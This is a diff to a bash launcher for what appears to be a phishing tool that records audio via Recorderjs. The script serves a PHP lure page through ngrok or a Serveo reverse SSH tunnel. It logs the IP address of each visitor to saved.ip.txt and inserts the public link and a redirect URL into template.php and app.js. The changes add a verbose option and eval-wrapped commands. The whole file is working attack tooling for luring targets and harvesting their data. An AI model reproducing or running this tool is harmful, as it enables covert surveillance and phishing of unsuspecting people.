@@ -6,8 +6,14 @@
 # Using Recorderjs by: https://github.com/mattdiamond/Recorderjs
 trap 'printf "\n";stop' 2
 
-banner() {
+null_redir="> /dev/null 2>&1"
+verb_xterm=""
+if [[ $# -eq 1 ]]; then
+  null_redir=""
+  verb_xterm="xterm -e"
+fi
 
+banner() {
 
 printf "\e[1;92m                                                              \e[0m\n"
 printf "\e[1;93m  ____              _   _      _ _       \e[0m\e[1;92m /__\   \e[0m\n"
@@ -32,15 +38,15 @@ checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
 checkssh=$(ps aux | grep -o "ssh" | head -n1)
 if [[ $checkngrok == *'ngrok'* ]]; then
-pkill -f -2 ngrok > /dev/null 2>&1
-killall -2 ngrok > /dev/null 2>&1
+eval pkill -f -2 ngrok $null_redir
+eval killall -2 ngrok $null_redir
 fi
 
 if [[ $checkphp == *'php'* ]]; then
-killall -2 php > /dev/null 2>&1
+eval killall -2 php $null_redir
 fi
 if [[ $checkssh == *'ssh'* ]]; then
-killall -2 ssh > /dev/null 2>&1
+eval killall -2 ssh $null_redir
 fi
 exit 1
 
@@ -48,18 +54,16 @@ exit 1
 
 dependencies() {
 
-command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+eval command -v php $null_redir || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 
 }
 
 catch_ip() {
-
 ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
 
 cat ip.txt >> saved.ip.txt
-
 
 }
 
@@ -85,19 +89,17 @@ rm -rf Log.log
 fi
 sleep 0.5
 
-done 
+done
 
 }
 
-
 server() {
-
-command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
+eval command -v ssh $null_redir || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
 
 printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
 
 if [[ $checkphp == *'php'* ]]; then
-killall -2 php > /dev/null 2>&1
+eval killall -2 php $null_redir
 fi
 
 if [[ $subdomain_resp == true ]]; then
@@ -111,14 +113,12 @@ $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:
 sleep 8
 fi
 printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
-fuser -k 3333/tcp > /dev/null 2>&1
-php -S localhost:3333 > /dev/null 2>&1 &
+eval fuser -k 3333/tcp $null_redir
+eval php -S localhost:3333 $null_redir &
 sleep 3
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
-
 }
-
 
 payload_ngrok() {
 
@@ -134,16 +134,16 @@ ngrok_server() {
 if [[ -e ngrok ]]; then
 echo ""
 else
-command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
-command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
+eval command -v unzip $null_redir || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
+eval command -v wget $null_redir || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
 printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
+eval wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip $null_redir
 
 if [[ -e ngrok-stable-linux-arm.zip ]]; then
-unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+eval unzip ngrok-stable-linux-arm.zip $null_redir
 chmod +x ngrok
 rm -rf ngrok-stable-linux-arm.zip
 else
@@ -153,10 +153,10 @@ fi
 
 else
 
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip 2>&1 > /dev/null 2>&1
+eval wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip 2>&1 $null_redir
 
 if [[ -e ngrok-stable-linux-386.zip ]]; then
-unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
+eval unzip ngrok-stable-linux-386.zip $null_redir
 chmod +x ngrok
 rm -rf ngrok-stable-linux-386.zip
 else
@@ -167,13 +167,13 @@ fi
 fi
 
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+eval php -S 127.0.0.1:3333 $null_redir &
 sleep 2
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
-./ngrok http 3333 > /dev/null 2>&1 &
+eval $verb_xterm "./ngrok http 3333 $null_redir" &
 sleep 10
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z-]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
 
 payload_ngrok
@@ -199,7 +199,7 @@ redirect_link="${redirect_link:-${default_redirect}}"
 
 if [[ $option_server -eq 1 ]]; then
 
-command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+eval command -v php $null_redir || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 start
 
 elif [[ $option_server -eq 2 ]]; then
@@ -216,12 +216,10 @@ fi
 
 payload() {
 
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-
+send_link=$(grep -o "https://[0-9a-z-]*\.serveo.net" sendlink)
 
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js
-
 
 }
 
@@ -249,4 +247,3 @@ checkfound
 banner
 dependencies
 start1
-
